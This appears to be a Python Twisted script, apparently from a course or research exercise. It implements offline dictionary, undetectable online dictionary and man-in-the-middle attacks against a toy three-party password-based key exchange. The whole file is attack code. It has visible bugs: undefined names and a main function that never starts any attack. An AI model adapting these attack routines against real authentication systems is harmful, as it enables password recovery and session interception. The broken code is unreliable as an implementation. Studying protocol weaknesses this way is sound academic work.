from twisted.internet import reactor, protocol
from random import seed, randint
from struct import pack, unpack
from optparse import OptionParser
import re
import xml.etree.ElementTree as xml
from math import log

settings = {
    'port': None,
    'pw': None,
    'id': None,
    'q': None,
    'g': None,
    'M': None,
    'N': None,
    'aid':None,
    'bid':None,
    'sid':None,
    'sip':None,
    'sport':None
}

def G(values: tuple):
    return (int((values[0] + int(values[1] / 2)) / 2) + values[2]) % 10 + 1


def H(values: tuple):
    return (values[0] + values[1] / 2 + values[2]) % 100 + 1


class IntruderClientFactory(protocol.ClientFactory):
    def __init__(self, inProtocol):
        protocol = inProtocol

    def clientConnectionFailed(self, connector, reason):
        reactor.stop()

    def clientConnectionLost(self, connector, reason):
        reactor.stop()

#Offline Dictionary attack

class OFFDA(protocol.Protocol):
    def __init__(self):
        seed()
        self.x = randint(1, settings['q'] - 1)
        self.y = randint(1, settings['q'] - 1)

    def connectionMade(self):
        self.transport.write(self.sendClientRequest())

    def dataReceived(self, data):
        K, S_Y = self.receiveServerResponse(data)

        self.guessPasswordA(K, S_Y)

        self.transport.loseConnection()

    def sendClientRequest(self):              
        print('Attacker action [*]: choosing random number x and y from Zp')
        
        print('Attacker paramteters [*]: x = ', self.x)
        print('Attacker paramteters [*]: y = ', self.y)
        X = settings['M'] ** self.x
        Y = settings['M'] ** self.y * settings['N'] ** settings['pw']

        print('Attacker action [*]: calculating specific X and Y')

        print('Attacker paramteters [*]: X = ', X)
        print('Attacker paramteters [*]: Y = ', Y)

        print('Attacker action [*]: sending A||X||B||Y to S\n')

        return pack('hxq', settings['aid'], X) + pack('hxq', settings['bid'], Y)

    def receiveServerResponse(self, response):
        S_X, S_Y = unpack('qxq', response)
        print('Attacker action [*]: receiving S_X||S_Y from S')
        print('S paramteters (received) [*]: S_X = ', S_X)
        print('S paramteters (received) [*]: S_Y = ', S_Y, '\n')

        print('Attacker action [*]: start guessing the password\n')

        K = int((int(S_X / (G((settings['bid'], settings['sid'], settings['M'] ** self.y)) ** settings['pw']))) ** self.y)
        print('Attacker calculates [*]: K = ', K)

        return K, S_Y

    def guessPasswordA(self, K, S_Y):
        pwA = 0
        cK = None

        while (K != cK and pwA - 1 < self.x):
            pwA += 1

            cK = int((int(S_Y / (G((settings['aid'], settings['sid'], settings['M'] ** (self.x - pwA))) ** pwA))) ** (self.x - pwA))

            print('\n----------------------------------------\n')

            print('Attacker calculates [*]: K\' = ', cK)
            print('Attacker try password [*]: guessed password = ', pwA)

        print('\n----------------------------------------\n')
        print('Attacker guessed password [$COMPLETE$]: pwA = ', pwA)

#Undetectable Online Dictionary attack

class UONDAlistner(protocol.Protocol):
    def __init__(self):
        seed()
        self.y = randint(1, settings['q'] - 1)
        self.pwGuess = 0
        self.g_x = None

        self.buffer = None
        self.proxyToServerProtocol = None

        self.initialReceive = False
        self.betaReceive = False

    def connectionMade(self):
        proxyToServerFactory = protocol.ClientFactory()
        proxyToServerFactory.protocol = UONDAproxy
        proxyToServerFactory.server = self

        reactor.connectTCP(settings['sip'], settings['sport'], proxyToServerFactory)

    def dataReceived(self, data):
        global A, X
        
        if not self.initialReceive:
            messForA, A, X = self.receiveConnectRequest(data)

            message = self.tryPassword(self.pwGuess)
            
            if self.proxyToServerProtocol:
                self.proxyToServerProtocol.write(message)
            else:
                self.buffer = message

            self.initialReceive = True

            self.writeToClient(messForA)

    def writeToClient(self, data):
        self.transport.write(data)

    def receiveConnectRequest(self, message):
        print('Attacker action [*]: choosing random y from Zp')
        print('Attacker parameters [*]: y = ', self.y)

        print('\nAttacker action [*]: receiving A||X from A')

        A, X = unpack('hxq', message)

        print('A parameters [*]: A = ', A)
        print('A parameters [*]: X = ', X, '\n')

        random_S_Y = randint(1, 100000)
        random_alpha = randint(1, 100000)
        print('Attacker parameters [*]: random S_Y = ', random_S_Y)
        print('Attacker parameters [*]: random alpha = ', random_alpha, '\n')

        print('Attacker action [*]: sending random S_Y||alpha to A (the correctness of the parameters is not important)')

        return pack('qxq', random_S_Y, random_alpha), A, X

    def tryPassword(self, pw):
        print('\n----------------------------------------\n')

        print('Attacker action [*]: trying password pwA\' = ', pw)

        g_power_g_x = int(X / settings['M'] ** pw)
        self.g_x = int(log(g_power_g_x, settings['g']))

        print('Attacker calculates [*]: g^x = ', self.g_x)

        Y = (g_power_g_x ** self.y) * settings['N'] ** settings['pw']
        print('Attacker calculates [*]: Y = ', Y, '\n')

        message = pack('hxq', A, X) + pack('hxq', settings['id'], Y)

        print('Attacker action [*]: sending A||X||B||Y to S\n')

        return message


class UONDAproxy(protocol.Protocol):
    def connectionMade(self):
        self.factory.server.proxyToServerProtocol = self
        self.write(self.factory.server.buffer)
        self.factory.server.buffer = ''

        self.serverResponseReceive = False

    def connectionLost(self, reason):
        pass

    def dataReceived(self, data):
        if not self.passwordGuessResult(data):
            self.factory.server.pwGuess += 1
            message = self.factory.server.tryPassword(self.factory.server.pwGuess)
            self.write(message)
        else:
            print('\n----------------------------------------\n')
            print('Attacker guessed password [$COMPLETE$] pwA = ', self.factory.server.pwGuess, '\n')
            #g_pwA = 0 пока не понятно, зачем я это сделал
            reactor.stop()

    def write(self, data):
        if data:
            self.transport.write(data)

    def passwordGuessResult(self, response):
        print('Attacker action [*]: receiving S_X||S_Y from S')

        S_X, S_Y = unpack('qxq', response)
        print('S parameters (received) [*]: S_X = ', S_X)
        print('S parameters (received) [*]: S_Y = ', S_Y)

        print('\nAttacker action [*]: checking a guess')

        g_power_xz = int(S_X / G((settings['id'], settings['sid'], settings['g'] ** (self.factory.server.g_x * self.factory.server.y))) ** settings['pw'])
        print('Attacker calculates [*]: g^(xz) = ', g_power_xz)

        g_power_xzy = int(S_Y / G((A, settings['sid'], settings['g'] ** self.factory.server.g_x)) ** self.factory.server.pwGuess)
        print('Attacker calculates [*]: g^(x\'zy) = ', g_power_xzy, '\n')

        if (g_power_xz ** self.factory.server.y == g_power_xzy):
            print('Attacker action [*]: g^(xz) = g^(x\'zy)')
            print('Attacker action [*]: the guess is correct')
            return True

        print('Attacker action [*]: g^(xz) != g^(x\'zy)')
        print('Attacker action [*]: the guess isn\'t correct')

        return False


#MITM

class MITMinitiator(protocol.Protocol):
    def __init__(self):
        seed()
        self.w = randint(1, settings['q'] - 1)

    def connectionMade(self):
        W = settings['g'] ** self.w * settings['M'] ** settings['pw']
        print('MITM action [*SESSION-2*]: choosing random number w from Zp')
        print('MITM paramteters [*SESSION-2*]: w = ', self.w)
        print('MITM paramteters [*SESSION-2*]: W = ', W)
        print('MITM action [*SESSION-2*]: calculating W')

        print('MITM action [*SESSION-2*]: sending A||W to B\n')

        self.write(pack('hxq', settings['aid'], W))

    def dataReceived(self, data):
        #C (client) <== B --- C (server) --- S
        global SK1, SK2

        S_W, alpha = unpack('qxq', data)
        print('MITM action [*SESSION-2*]: receiving S_W||alpha from B')
        print('S paramteters (received) [*SESSION-2*]: S_W = ', S_W)
        print('B paramteters (received) [*SESSION-2*]: alpha = ', alpha, '\n')

        g_power_yz = int(S_W / (G((settings['id'], settings['sid'], settings['g'] ** self.w)) ** settings['pw']))
        print('MITM calculates [*SESSION-2*]: g^(yz) = ', g_power_yz)

        test_alpha = int(G((settings['aid'], settings['bid'], g_power_yz ** self.w)))

        if alpha == test_alpha:
            print('MITM action [*SESSION-2*]: alpha\' = alpha')
            print('MITM status [*SESSION-2*]: MITM alpha check was successful.')
            print('MITM status [*SESSION-2*]: Session key can be calculated.\n')

            SK2 = H((settings['aid'], settings['bid'], g_power_yz ** self.w))

            beta = int(G((settings['bid'], settings['aid'], g_power_yz ** self.w)))
            print('MITM calculates [*SESSION-2*]: beta = ', beta)
            print('MITM action [*SESSION-2*]: sending beta to B\n')

            self.write(pack('q', beta))
            self.transport.loseConnection()

            print('MITM status [*]: Attack completed successfully.')
            print('MITM results [*A <--> MITM*]: SK = ', SK1)
            print('MITM results [*MITM <--> B*]: SK = ', SK2)
        else:
            print('MITM action [*SESSION-2*]: alpha\' != alpha')

    def write(self, data):
        self.transport.write(data)


class MITMlistner(protocol.Protocol):
    def __init__(self):
        seed()
        self.v = randint(1, settings['q'] - 1)
        self.g_power_xz = None

        self.connected = False
        self.connectionToTS = None
        self.forWaitBuffer = ''

        MITMlproxyFactory = protocol.ClientFactory()
        MITMlproxyFactory.protocol = MITMlproxy
        MITMlproxyFactory.main = self

        reactor.connectTCP(settings['sip'], settings['sport'], MITMlproxyFactory)

    def dataReceived(self, data):
        global SK1

        if not self.connected:            
            V = settings['g'] ** self.v * settings['N'] ** settings['pw']
            print('MITM action [*SESSION-1*]: receiving A||X from A\n')
            
            print('MITM action [*SESSION-1*]: choosing randomg number v from Zp')
            print('MITM paramteters [*SESSION-1*]: v = ', v)
            print('MITM action [*SESSION-1*]: calculating V')
            print('MITM paramteters [*SESSION-1*]: V = ', V)

            print('MITM action [*SESSION-1*]: sending A||X||C||V to S\n')


            if self.connectionToTS is not None:
                self.connectionToTS.write(data + pack('hxq', settings['id'], V))
            else:
                self.forWaitBuffer = data + pack('hxq', settings['id'], V)

            self.connected = True
        else:
            beta = unpack('q', data)[0]
            print('MITM status [*SESSION-1*]: Client A alpha check was successful.')
            print('MITM status [*SESSION-1*]: Session key can be calculated.\n')
            print('MITM action [*SESSION-1*]: receiving beta from A')
            print('A paramteters (received) [*SESSION-1*]: beta = ', beta)
            print('MITM action [*SESSION-1*]: independently calculate the beta\' and compare it with the beta')

            if beta == int(G((settings['bid'], settings['aid'], self.g_power_xz ** self.v))):
                print('MITM action [*SESSION-1*]: beta\' = beta\n')
                SK1 = H((settings['aid'], settings['bid'], self.g_power_xz ** self.v))

                MITMinitiatorFactory = protocol.ClientFactory()
                MITMinitiatorFactory.protocol = MITMinitiator

                reactor.connectTCP(public.B_CLIENT_IP, public.B_CLIENT_PORT, MITMinitiatorFactory)
            else:
               print('MITM action [*SESSION-1*]: beta\' != beta')
               print("MITM Error [!SESSION-1!]: Wrong beta.\n")

    def write(self, data):
        self.transport.write(data)


class MITMlproxy(protocol.Protocol):
    def connectionMade(self):
        self.factory.main.connectionToTS = self

        if self.factory.main.forWaitBuffer != '':
            self.write(self.factory.main.forWaitBuffer)
            self.factory.main.forWaitBuffer = ''

    def dataReceived(self, data):
        S_X, S_V = unpack('qxq', data)
        print('MITM action [*SESSION-1*]: receiving S_X||S_V from S')

        print('S paramteters (received) [*SESSION-1*]: S_X = ', S_X)
        print('S paramteters (received) [*SESSION-1*]: S_V = ', S_V, '\n')
        self.factory.main.g_power_xz = int(S_X / G((settings['id'], settings['sid'], settings['g'] ** self.factory.main.v)) ** settings['pw'])
        print('MITM calculates [*SESSION-1*]: g^(xz) = ', self.factory.main.g_power_xz)
        alpha = int(G((settings['aid'], settings['bid'], self.factory.main.g_power_xz ** self.factory.main.v)))
        print('MITM calculates [*SESSION-1*]: alpha = ', alpha)

        print('MITM action [*SESSION-1*]: sending S_V||alpha to A\n')
     
        self.factory.main.write(pack('qxq', S_V, alpha))

    def write(self, data):
        self.transport.write(data)


class MITMserver(protocol.Protocol):
    def __init__(self):
        self.connectionToTS = None
        self.forWaitBuffer = ''

        MITMsproxyFactory = protocol.ClientFactory()
        MITMsproxyFactory.protocol = MITMsproxy
        MITMsproxyFactory.main = self

        reactor.connectTCP(settings['sip'], settings['sport'], MITMsproxyFactory)

    def dataReceived(self, data):
        A, W, B, Y = unpack('hxqhxq', data)

        if self.connectionToTS is not None:
            self.connectionToTS.write(pack('hxqhxq', settings['id'], W, B, Y))
        else:
            self.forWaitBuffer = pack('hxqhxq', settings['id'], W, B, Y)

        print('MITM status [*SESSION-2*]: Change message from A||W||B||Y to C||W||B||Y and send to TS.\n')

    def write(self, data):
        self.transport.write(data)

        print('MITM status [*SESSION-2*]: Proxy TS answer W\'||Y\' to B.\n')


class MITMsproxy(protocol.Protocol):
    def connectionMade(self):
        self.factory.main.connectionToTS = self

        if self.factory.main.forWaitBuffer != '':
            self.write(self.factory.main.forWaitBuffer)
            self.factory.main.forWaitBuffer = ''

    def dataReceived(self, data):
        self.factory.main.write(data)
        self.transport.loseConnection()

    def write(self, data):
        self.transport.write(data)


def main():
    optionParser = OptionParser()

    optionParser.add_option('-m', '--mitm', action='store_true')
    optionParser.add_option('-o', '--offline-dict', action='store_true')
    optionParser.add_option('-u', '--undetectable-online-dict', action='store_true')

    reactor.run()


if __name__ == '__main__':
    main()